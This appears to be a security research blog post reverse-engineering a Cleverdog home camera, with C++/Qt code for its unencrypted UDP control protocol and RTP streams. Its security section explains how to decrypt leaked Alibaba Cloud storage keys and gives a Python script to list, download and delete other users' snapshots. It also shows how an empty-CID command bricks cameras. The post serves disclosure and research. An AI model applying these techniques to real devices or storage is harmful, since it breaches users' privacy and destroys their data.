We will first look at the commands that we can send over UDP before looking into the video stream. So far we have found 0x1004, 0x1007, 0x1008, 0x100e. Each datagram starts with the magic number 0x4D4A followed by a two byte command, this is followed by the CID of the device we want to communicate with, or null bytes when probing for devices. After this are further parameters which are - probably - separated by null bytes. Let's write some code to implement this protocol! I will use C++ with Qt in this example.

Start with a simple class:
```c++
#include <QUdpSocket>

class CleverdogUDP : public QObject
{
	Q_OBJECT
public:
	explicit CleverdogUDP(QObject *parent = 0);
signals:
	void log(QString message);
private slots:
	void signallingDatagramPending();
private:
	void sendCommand(QHostAddress destinationHost, uint16_t command, QString cid, QByteArray parameters);
	QUdpSocket *signallingSocket;
	const unsigned char magicNumber[2] = {0x4d, 0x4a};
};
```
The constructor will initialize the QUdpSocket and set up the slot for incoming datagrams.
```c++
CleverdogUDP::CleverdogUDP(QObject *parent) : QObject(parent)
{
	signallingSocket = new QUdpSocket(parent);
	signallingSocket->bind(10009, QUdpSocket::ShareAddress);
	connect(signallingSocket, SIGNAL(readyRead()), this, SLOT(signallingDatagramPending()));
}
```
The sendCommand function will be used to send out the datagrams,
```c++
void CleverdogUDP::sendCommand(QHostAddress destinationHost, uint16_t command, QString cid, QByteArray parameters)
{
	command = htons(command);
	QByteArray datagram;
	/* Add magic number */
	datagram.append(QByteArray::fromRawData((const char*)&magicNumber, 2));
	/* Command */
	datagram.append(QByteArray::fromRawData((const char*)&command, 2));
	/* CID, add null padding in case its less than 15 characters */
	if (cid.length() > 15) {
		cid = cid.left(15);
	}
	datagram.append(cid);
	for (int i = 15 - cid.length(); i > 0; i--) {
		datagram.append((char)0x00);
	}
	datagram.append((char)0x00);
	/* Parameters */
	datagram.append(parameters);
	/* Send datagram */
	signallingSocket->writeDatagram(datagram, destinationHost, 10008);
}
```
Compose the datagram with the magic number, command, CID and parameters. From the packets we saw earlier I made the assumption that the CID can be up to 15 bytes with a null to terminate the string. The signallingDatagramPending slot will be implemented later on. First we start by sending out a test command to see if we got it right. To simplify things I have also defined an enum that will hold the command codes:
```c++
typedef enum {
	cmdScan =	0x1004,
	cmdStartRtp =	0x1007,
	cmdStopRtp =	0x1008,
	cmdScanReply =	0x100e
} cleverdogUdpCommands;
```
Start with a function to send out datagrams to look for devices on the network:
```c++
void CleverdogUDP::scanForDevices()
{
	sendCommand(QHostAddress::Broadcast, cmdScan, "", QByteArray::fromHex("00000000000000000000000000000000000000"));
}
```
Calling the scanForDevices function makes the camera reply with the 0x100e command ID. Since that works we can try to send it without the null bytes as parameters. That still works fine, so I'll update the function definition to clean the code a bit:
```c++
void sendCommand(QHostAddress destinationHost, uint16_t command, QString cid = "", QByteArray parameters = QByteArray());
```
Now it's time to parse the replies, for this we have to implement the signallingDatagramPending slot.
```c++
void CleverdogUDP::signallingDatagramPending()
{
	QHostAddress host;
	uint16_t port;
	QByteArray datagram;
	while (signallingSocket->hasPendingDatagrams()) {
		datagram.resize(signallingSocket->pendingDatagramSize());
		signallingSocket->readDatagram(datagram.data(), datagram.size(), &host, &port);
		/* Check for the magic number */
		if (datagram.left(2) != QByteArray::fromRawData((const char*)&magicNumber, 2)) {
			continue;
		}
		datagram.remove(0, 2);
		uint16_tcommand = ntohs(*(uint16_t*)(datagram.data()));
		datagram.remove(0, 2);
		QString cid = QString(datagram.left(16));
		datagram.remove(0, 16);
		switch(command) {
			case cmdScanReply:
				/* Parameters are MAC address and software version */
				QString mac = datagram.left(datagram.indexOf((char)0x00));
				datagram.remove(0, datagram.indexOf((char)0x00) + 1);
				QString version = datagram.left(datagram.indexOf((char)0x00));
				emit log("Found a device\nIP: " + QHostAddress(host.toIPv4Address()).toString() + "\nCID: " + cid + "\nMAC: " + mac + "\nFirmware version: " + version);
			break;
		}
	}
}
```
By using the switch for the command ID we can easily add support for other commands later on. For now just log any reply we get to the scan command.
Next up I added the functions for cmdStartRtp and cmdStopRtp:
```c++
void CleverdogUDP::startRtp(QHostAddress host, QString cid, uint16_t port)
{
	QByteArray parameters;
	parameters.append(QByteArray::fromHex("000000000000000000000000000000000000"));
	parameters.append(QString::number(port));
	parameters.append(':');
	parameters.append(QString::number(port));
	parameters.append(QByteArray::fromHex("00"));
	sendCommand(host, cmdStartRtp, cid, parameters);
}
void CleverdogUDP::stopRtp(QHostAddress host, QString cid)
{
	sendCommand(host, cmdStopRtp, cid);
}
```
I tried changing the null bytes in the start command to find out if that would change anything in the message on the log page but that was not the case. It would have been nice to be able to change the destination host for instance, the port after the semicolon is not used as far as I can see. When starting the RTP it stops automatically after a couple of seconds with the message
```
jfg_rtpserver:rtp timeout.
```
It's probably also expecting an incoming stream, maybe just rtcp or something else.
After have these functions in place I tried sending various other command codes to see what the reply would be. I found 0x1006 (without parameters) returns
```
’ªdo_log_ackÚ�,jfg_ctrl: recv message, magic=4D4A, id=1006
’ªdo_log_ack¼test_only=0, env->cur_env=1
’ªdo_log_ackÚ�<[http.c    :  143] http: connect [127.0.0.1:80] failed: 103
’ªdo_log_ackÚ�;[jfg_http.c:  416] http: download failed, total=0 error=-4
’ªdo_log_ackÚ�'[jfg_upgrad:   52] download result: -4
’ªdo_log_ackÚ�/[jfg_ctrl.c:   80] Upgrade firmware failed: -4
```
Which also returns a UDP packet:
```
0x10 0x03 i -
0000   4d 4a 10 03 30 30 30 30 30 30 30 30 30 30 30 30  MJ..000000000000
0010   00 00 00 00 30 30 3a 30 30 3a 30 30 3a 30 30 3a  ....00:00:00:00:
0020   30 30 3a 30 30 00 10 06 ff ff ff fc              00:00.......
```
Which looks like an error message, there is the command code 0x1006 together with 0xfffffffc (-4), so another case can be added to the switch in signallingDatagramPending() to handle it. I tried adding parameters but was not able to find anything to change the "http: connect" message. Since I have no firmware to upload this is not that important at the moment.
When I continued trying command codes I ran into a lot of trouble, as it turns out 0x1005 is used to change the CID! And when there are no parameters it will assign the camera an empty CID. This causes the camera to think it's in factory mode and makes it disconnect from the WiFi network.
After disconnecting the log page is of course also unavailable so I had no clue what was going on and it was bricked as far as I could make out... it took me a couple of days to unbrick it.

My first thought was to look for some kind of programming pins or an UART to find out what was going on, on the PCB (V1.7) there is a main SoC from Fullhan: the fh8610. There is almost zero documentation on this chip to be found which is rather annoying. A thorough search with Google and Baidu gave me a couple of starting points:
- [A Japanese teardown](http://yoshi-s.cocolog-nifty.com/cpu/2016/05/ip-95d6.html) - Sadly not much information here that I couldn't find myself
- [A github gist](https://gist.github.com/Akagi201/270efceafb9bff949674) - A baudrate, so there ought to be a serial port (can't imagine a SoC without an UART really)
- [Stackexchange about firmware](https://reverseengineering.stackexchange.com/questions/15088/lzma-file-format-not-recognized-details-enclosed) - Somebody trying to reverse engineer an older firmware version, with a link to the binary! Worst case I can try to reverse it to find out what 0x1005 did...
- [SDK for fh8610](https://yun.baidu.com/share/link?uk=1780856861&shareid=2082226983) - Tells us that it's an ARC architecture processor, which is good to know, but bad because IDA doesn't know that architecture so reversing the binary from stackexchange will be a pain.
- [Synopsis ARC toolchain](https://github.com/foss-for-synopsys-dwc-arc-processors/toolchain/releases/) - GCC compiler for the ARC architecture, has objdump so can help in reverse engineering.
- [FCC application for camera](https://fccid.io/2ADHE-DOG-1W) - Overview of the FCC test application for an earlier version of the camera, this one has the UART broken out. Shame we're on V1.7 where these pins are not readily available. Also a shame that the block diagram and schematic are confidential.
- [FCC application for a camera drone with the same SoC](https://fccid.io/2ACZLLS16C24GR) - Finally, a circuit diagram with the fh8610 pinout!

Using the pinout I was able to locate the UART traces on the PCB, sadly they just led to a via that was not connected to anything I could see and no other points where it might turn up again. I was also able to confirm that the few labeled points on the PCB are the SPI bus for the NOR flash memory. I made some attempts to read the flash chip but I was unsuccessful in doing that. I suppose that is because the SoC is also trying to access it, and anyway it's not even clear if the firmware is actually in the flash memory..
I ended up scraping the coating from the traces and soldering directly onto the traces. Using the baudrate from the github gist I was able to read boot messages and see that the device was in factory mode and looking for an SSID "jiafeigou" with password 12345678. By adding that SSID to my access points the camera got back onto the network and I could set the correct CID to bring it back to normal operation.
```c++
void CleverdogUDP::setCid(QHostAddress host, QString cid)
{
	sendCommand(host, cmdSetCid, cid);
}
```
After unbricking the camera I set about examining the onboard procedure because I had hunch it would probably use the same protocol to communicate between the app and the camera. Playing with the app I came to the following flow when the app connects to the 'DOG-XXXXXX' SSID:
```
App → Broadcast:	0x1004 find devices
Camera → App:		0x100e report device info
App → Broadcast:	0x0000 find unconfigured devices
Camera → App:		0x0001 reporting CID
App → Camera:		0x0002 scan for WiFi networks
Camera → App:		0x0003 WiFi SSID found (repeated for each SSID found)
App → Camera:		0x0004 set WiFi SSID and PSK
Camera → App:		0x0005 Acknowledge WiFi settings
App → Camera:		0x000d Set backend address
Camera → Backend (tcp):	0x966a Send version and CID
Camera → Backend (tcp):	0x9b64 Send CID, SSID, software version, hardware version and MAC address
```
After this the camera connects to the configured SSID and it's listed in the app under the account used to perform the onboarding. I tried some other command codes starting with 0x00, and found that 0x000d can be used to set the 'server' (backend address) and 0x000e is used to set a timezone. The timezone is reset when the camera connects to the backend.
By changing the server address we won't stop the connection requests to the log server, but at least we can disable the backend. I didn't examine the TCP traffic to the backend further.

Media
-----
To have a look at the media stream I used the 0x1007 command to start a stream to my workstation and tried to get Wireshark to decode it as RTP because the logs mention RTP. Wireshark seems to think it's an "Unknown RTP version 1", that doesn't feel right. So I had a look at the raw payload. I noticed that some of the smaller packets had somewhat repeating payloads. I have written a RTP implementation myself (half arsed; just plays a sinus, DTMF tones or echos the incoming stream with a 1 second delay) and remembered that G711 payloads tend to look like that when there is near silence, and that 0x80 is the start of a normal RTP packet. It's also remarkable how the presumed video frames (large and more random payload) are prefixed with 0x40000100 before a 0x80 byte and the presumed audio frames (regular small size and patterned payload) have 0x40000000 as the prefix.
Looks like something we can work with, because I love Wireshark for voice analysis I opted to extend the little program with another component:
```c++
class MediaRecaster : public QObject
{
	Q_OBJECT
public:
	explicit MediaRecaster(QObject *parent = 0);
	uint16_t getRtpPort();
signals:
	void log(QString message);
private slots:
	void mediaDatagramPending();
private:
	QUdpSocket *rtpSocket;
};
```
This class will bind to a random free port, which we can retrieve with getRtpPort() to use as payload in the 0x1007 command, and reply the packets with the first 4 bytes stripped to the sender.
```c++
void MediaRecaster::mediaDatagramPending()
{
	while (rtpSocket->hasPendingDatagrams()) {
		QHostAddress host;
		uint16_t port;
		QByteArray datagramIn;
		datagramIn.resize(rtpSocket->pendingDatagramSize());
		rtpSocket->readDatagram(datagramIn.data(), datagramIn.size(), &host, &port);
		datagramIn = datagramIn.remove(0, 4);
		rtpSocket->writeDatagram(datagramIn.data(), datagramIn.size(), host, port);
	}
}
```
When we examine the result in Wireshark the stripped frames can now be recognized as valid RTP. One video stream (Set dynamic RTP type 96 to H264 to get it parsing the H264 information) and another G711 stream:
```
Real-Time Transport Protocol
    10.. .... = Version: RFC 1889 Version (2)
    ..0. .... = Padding: False
    ...0 .... = Extension: False
    .... 0000 = Contributing source identifiers count: 0
    0... .... = Marker: False
    Payload type: ITU-T G.711 PCMU (0)
    Sequence number: 0
    Timestamp: 26720
    Synchronization Source identifier: 0x00000001 (1)
```
and
```
Real-Time Transport Protocol
    10.. .... = Version: RFC 1889 Version (2)
    ..0. .... = Padding: False
    ...0 .... = Extension: False
    .... 0000 = Contributing source identifiers count: 0
    0... .... = Marker: False
    Payload type: DynamicRTP-Type-96 (96)
    Sequence number: 145
    Timestamp: 1060627034
    Synchronization Source identifier: 0x00000000 (0)
```
After this I had a look at why the stream kept stopping after a while, it turns out that the app sends RTCP packets with a prefix ```0x00000100```. These packets contain a sender report and source description:
```
Real-time Transport Control Protocol (Sender Report)
    10.. .... = Version: RFC 1889 Version (2)
    ..0. .... = Padding: False
    ...0 0000 = Reception report count: 0
    Packet type: Sender Report (200)
    Length: 6 (28 bytes)
    Sender SSRC: 0x19fe408d (436093069)
    Timestamp, MSW: 3713627565 (0xdd5975ad)
    Timestamp, LSW: 2395857312 (0x8ecde1a0)
    [MSW and LSW as NTP timestamp: Sep  5, 2017 19:12:45.557829000 UTC]
    RTP timestamp: 2976483046
    Sender's packet count: 0
    Sender's octet count: 0
Real-time Transport Control Protocol (Source description)
    10.. .... = Version: RFC 1889 Version (2)
    ..0. .... = Padding: False
    ...0 0001 = Source count: 1
    Packet type: Source description (202)
    Length: 2 (12 bytes)
    Chunk 1, SSRC/CSRC 0x19FE408D
        Identifier: 0x19fe408d (436093069)
        SDES items
            Type: CNAME (user and domain) (1)
            Length: 0
            Type: END (0)

```
But as the packet count implies there are no media packets from this host (audio sending was disabled). Let's see if the incoming stream will continue when we send out RTCP packets periodically. So I added a QTimer (singleshot, gets restarted when datagrams are received and it's not running) with the following thing to cobble together the RTCP packet on the timeout slot:
```c++
void MediaRecaster::rtcpTimerTimeout(MediaRecaster::QPrivateSignal)
{
	QByteArray rtcpPacket;
	uint8_t padding[] = {0x00, 0x00, 0x01, 0x00};
	rtcpPacket.append((const char*)padding, 4);
	rtcpPacket.append((char)0x80);	// RTP v2
	rtcpPacket.append((char)0xc8);	// RTCP sender report packet type
	uint16_t length = 0x0006;	// (6 + 1) * 4 = 28 bytes
	rtcpPacket.append((const char*)&length, 2);
	uint32_t ssrc = htonl(0x00000002);
	rtcpPacket.append((const char*)&ssrc, 4);
	// https://github.com/MugenSAS/osc-cpp-qt/blob/master/tools/NtpTimestamp.cpp
	uint64_t ntpMSecs = QDateTime::currentMSecsSinceEpoch() + 2208988800000ll;
	uint32_t seconds = htonl(ntpMSecs / 1000);
	uint32_t fraction = htonl((0x100000000 * (ntpMSecs % 1000)) / 1000);
	rtcpPacket.append((const char*)&seconds, 4);
	rtcpPacket.append((const char*)&fraction, 4);
	quint32 rtpTime = 0;
	rtcpPacket.append((const char*)&rtpTime, 4);
	uint32_t packetCount = 0;
	rtcpPacket.append((const char*)&packetCount, 4);
	uint32_t octetCount = 0;
	rtcpPacket.append((const char*)&octetCount, 4);
	rtpSocket->writeDatagram(rtcpPacket.data(), rtcpPacket.size(), this->rtpRemoteHost, this->rtpRemotePort);
}
```
After getting a working video and audio stream I wrote a very minimal RTSP impementation and hooked the camera up to mplayer and Synology Surveillance Station which worked well enough. I guess we can always used that as a baby monitor if we don't like the cloud.

So up to this point there has been some analysis of the behaviour and protocols used by the camera. The UDP protocol was simple enough to reverse engineer up to a point where we have enough control of the camera to use it for RTSP based recorders. Using the information we've obtained so far and Wireshark it should be easy enough to also send audio to the camera. Because none of the communication - neither to the backend nor locally with the app - is encrypted it's time to look at the security implications this brings...

Security
--------

Let's look at the possible attack vectors that we have identified so far:
1. No encryption with backend, so man in the middle is easy enough.
2. Snapshots are sent to the Alibaba Cloud platform "aliyun", but information (server, bucket, accesskey and some as of yet unknown information) is passed to the camera in plain text (see point 1). Possibly there is more information to be had from aliyun.
3. Local commands are not encrypted nor authenticated so we can:
- "Brick" any device in the same way I "bricked" my device when setting an empty CID.
- Possibly upload rogue firmware with the firmware upgrade command, this requires us to get the SDK working for this device.
- Impersonate devices and possibly perform the onboarding for a CID that we do not own and look in on remote devices with the app.

I will start with the last item mentioned; trying to onboard a CID that we don't own and see what happens. Because the onboarding command sequence is know I have implemented it in the existing CleverdogUDP class. After trying for some time I think that there is some kind of database of known CIDs possibly together with the MAC address belonging to that unit, I picked a few random values and only managed to onboard one. Trying to onboard a CID that is known to be bound to another account and with random MAC address didn't seem to work. This point might be safe, at least nobody can hijack my camera that easily. In the process I suppose I might have blocked a certain CID for a future user.

The second point is more severe. Let's recall what the packet looked like which supplied the Aliyun details:
```
0000   99 cc 80 a0 ac 30 30 30 30 30 30 30 30 30 30 30  .....00000000000
0010   30 03 bd 6f 73 73 2d 65 75 2d 63 65 6e 74 72 61  0..oss-eu-centra
0020   6c 2d 31 2e 61 6c 69 79 75 6e 63 73 2e 63 6f 6d  l-1.aliyuncs.com
0030   ac 64 65 2d 6a 69 61 66 65 69 67 6f 75 b0 42 42  .de-jiafeigou.BB
0040   42 42 42 42 42 42 42 42 42 42 42 42 42 42 da 00  BBBBBBBBBBBBBB..
0050   40 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  @CCCCCCCCCCCCCCC
0060   43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
0070   43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
0080   43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
0090   43 ce 44 44 44 44                                C.DDDD
```

| String                          | Meaning                                       |
|---------------------------------|-----------------------------------------------|
| oss-eu-central-1.aliyuncs.com   | Alibaba cloud OSS region server               |
| de-jiafeigou                    | Alibaba cloud OSS Bucket                      |
| BBBBBBBBBBBBBBBB                | Alibaba cloud OSS AccessKey                   |
| @CCCCCCCCCCCCCCCCC...           | Alibaba cloud OSS AccessKeySecret "encrypted" |
| DDDD                            | Used to decrypt AccessSecret ("Mask")         |

A plain HTTP PUT request is used along with the credentials to save snapshots to present in the app before a P2P session is established with the camera. Note that the fact this packet is not encrypted is of course bad (mitm can extract the payload), but the authentication method is still secure enough.
```
Hypertext Transfer Protocol
    PUT /000000000000/1505334114_1.jpg?OSSAccessKeyId=BBBBBBBBBBBBBBBB&Expires=1505334714&Signature=vPJ%2FmSCjsc5MBE8Oz2MAE76iFEQ%3D HTTP/1.0\r\n
        Request Method: PUT
        Request URI: /000000000000/1505334114_1.jpg?OSSAccessKeyId=BBBBBBBBBBBBBBBB&Expires=1505334714&Signature=vPJ%2FmSCjsc5MBE8Oz2MAE76iFEQ%3D
            Request URI Path: /000000000000/1505334114_1.jpg
            Request URI Query: OSSAccessKeyId=BBBBBBBBBBBBBBBB&Expires=1505334714&Signature=vPJ%2FmSCjsc5MBE8Oz2MAE76iFEQ%3D
                Request URI Query Parameter: OSSAccessKeyId=BBBBBBBBBBBBBBBB
                Request URI Query Parameter: Expires=1505334714
                Request URI Query Parameter: Signature=vPJ%2FmSCjsc5MBE8Oz2MAE76iFEQ%3D
        Request Version: HTTP/1.0
    Host: de-jiafeigou.oss-eu-central-1.aliyuncs.com:80\r\n
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64)\r\n
```
Strange detail that it presents itself as a 64-bit Windows 10 Mozilla browser. The BBB string matches the one in the packet received from the backend, I noticed my device receives the same BBB string every bootup, so it's either bound to a CID or worse: common for all devices.

According to the [documentation](https://www.alibabacloud.com/help/doc-detail/31952.htm?spm=a3c0i.o31835en.a3.3.2fbf62fdFks7Ki) a signature is generated as follows:
```
    Signature = urlencode(base64(hmac-sha1(AccessKeySecret,
              VERB + "\n" 
              + CONTENT-MD5 + "\n" 
              + CONTENT-TYPE + "\n" 
              + EXPIRES + "\n" 
              + CanonicalizedOSSHeaders
              + CanonicalizedResource)))
```
The question is how to get the AccessKeySecret, using the CCC string did not work, so at least they didn't send it plaintext. The ever to useful debug page on port 54321 came to the rescue, when a snapshot is uploaded some helpful debugging information is presented, I have obfuscated this as it's such a big hole:
```
jfg_client_on_oss_config type:3
jfg_client:oss url: [oss-eu-central-1.aliyuncs.com]
jfg_client:oss bucket: [de-jiafeigou]
jfg_client:oss access Id: [BBBBBBBBBBBBBBBB]
[jfg_http.c:  544] Before MD5: [EEEEEEEEEEEEEEEEEEEEEEEEEEEEE-de-jiafeigou000000000000]
[jfg_http.c:  560] MD5:  [6b8b880aea2131fd93d0447bf6da42bf]
[jfg_http.c:  561] MASK: [4833DACD]
[jfg_http.c:  575] KEY:  [b821fd93047f642f]
[jfg_http.c:  582] encsec before base64 decode=[CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC] len=64
[jfg_http.c:  596] encsec after base64 decode, len=48
... Hex dump of base64 decode of CCC ...
[jfg_http.c:  603] ACCESS SEC=
... Hex dump of decrypted CCC ...
```
The EEE string is a static prefix (which contains the text **aes**), which is hashed together with the bucket and the CID. The mask received from the backend is used as a "bytemask" on the hash to obtain the decryption key:
```
0x4833DACD = 0b1001000001100111101101011001101

6b8b880aea2131fd93d0447bf6da42bf
01001000001100111101101011001101
--------------------------------
 b  8     21  fd93 04 7 f6  42 f
```
So that gives a 64-bit key to start with, that doesn't work for AES which needs at least 128 bits. So I experimented a bit and found that the string value "b821fd93047f642f" was the correct key used with AES in ECB mode. Which handed me the Aliyun AccessKeySecret starting at offset 0x10 as a 40 byte string value.

Since there is a [SDK available](http://aliyun-oss-python-sdk.readthedocs.io/en/stable/oss2.html), I used python to see what the AccessKey would allow me to see.

```python
import oss2
import sys

access_key_id = "yourkeyhere"
access_key_secret = "yoursecrethere"
bucket_name = "yourbuckethere"
endpoint = "yourendpointhere"

bucket = oss2.Bucket(oss2.Auth(access_key_id, access_key_secret), endpoint, bucket_name)

if sys.argv[1] == "get":
	bucket.get_object_to_file(sys.argv[2], "~/snapshot.jpg")
elif sys.argv[1] == "list":
	result = bucket.list_objects(prefix=sys.argv[2], max_keys=1)
	for obj in result.object_list:	
		print obj.key
```
Because this service does not delete any uploaded snapshots - I keep telling, when you put something on the internet it never gets deleted! - the 1000 object maximum was a bit of a limit since every CID stores lots of snapshots. So adding a prefix would allow to trawl around for different CIDs.

The following code could be used to remove any snapshots:
```python
elif sys.argv[1] == "delete":
	result = bucket.list_objects(prefix=sys.argv[2], max_keys=1000)
	for obj in result.object_list:
		print obj.key
		bucket.delete_object(key = obj.key)
```

In conclusion
-------------

Looking back at the goals set in the introduction, we can answer all questions with the knowledge gained:
1. How is the backend involved and what does that mean for privacy
-  It's used to set up STUN for remote access, so no port forwarding needed which is very friendly to non-technical users
-  It receives periodic snapshots which are never deleted, and accessible to any other camera user in theory
-  **All communication is unencrypted**
2. How can we bend the camera to our will (and use it without the backend)
-  We can modify the backed address and decouple the camera from the internet
-  We can use the Cleverdog UDP protocol to start and stop the video feeds, some further research could enable us to send audio back to the camera
3. What's the security like for this product
-  **Awful, when we intercept the unencrypted backend communication we can get a valid AccessKey and AccessKeySecret for Aliyun giving us at least reading, writing and deletion rights on the bucket.**
4. Can we perform the onboarding procedure without the app
-  Using the Cleverdog UDP protocol we can do that

So, concluding, **I would recommend anybody not to use this camera with its offical backend unless it's updated to use encryption on the communication with the backend and the snapshots are not stored on the cloud storage permanently**. 

For my research I have not had to disassemble or otherwise reverse engineer the firmware of the device, all observations are based on captured network traffic and the debugging backdoor left in the device. This would have been impossible if proper encrypted communication had been used.
